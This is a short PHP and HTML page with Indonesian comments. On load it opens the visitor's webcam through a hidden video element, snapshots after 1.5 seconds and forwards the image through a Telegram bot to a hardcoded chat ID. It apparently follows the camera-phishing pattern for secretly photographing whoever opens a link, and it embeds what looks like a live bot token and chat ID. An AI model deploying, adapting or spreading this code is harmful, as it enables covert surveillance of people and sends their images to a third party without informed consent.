<?php
// ========== BACKEND: Kirim foto ke Telegram ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $botToken = '7779236534:AAEU6uV3iQxsPmBqv77YM1puM4H9bRXmvyE';         // Ganti dengan token bot kamu
    $chatId = '7799140879';             // Ganti dengan chat_id penerima

    if (!empty($_FILES['photo']['tmp_name'])) {
        $photoPath = $_FILES['photo']['tmp_name'];

        $url = "https://api.telegram.org/bot$botToken/sendPhoto";

        $postFields = [
            'chat_id' => $chatId,
            'photo' => new CURLFile($photoPath)
        ];

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postFields
        ]);

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            echo 'CURL Error: ' . curl_error($ch);
        } else {
            echo 'Berhasil kirim ke Telegram:<br>' . $response;
        }
        curl_close($ch);
    } else {
        echo 'Tidak ada file yang dikirim.';
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Kirim Gambar ke Bot Telegram</title>
</head>
<body>
  <h2>Ambil dan Kirim Gambar ke Telegram</h2>
  <p id="status">Mengambil gambar...</p>

  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <img id="preview" style="max-width: 300px; display:none;" />

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const preview = document.getElementById('preview');
    const status = document.getElementById('status');

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            // Ambil gambar dari kamera
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Tampilkan preview
            const imageData = canvas.toDataURL('image/png');
            preview.src = imageData;
            preview.style.display = 'block';

            // Ubah ke Blob dan kirim ke PHP
            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append('photo', blob, 'snapshot.png');

              fetch('', {
                method: 'POST',
                body: formData
              })
              .then(res => res.text())
              .then(response => {
                status.innerHTML = 'Respon dari server:<br><pre>' + response + '</pre>';
              });

              // Matikan kamera
              stream.getTracks().forEach(track => track.stop());
            }, 'image/png');
          }, 1500);
        };
      } catch (err) {
        status.textContent = 'Gagal mengakses kamera: ' + err.message;
      }
    }

    window.onload = startCamera;
  </script>
</body>
</html>
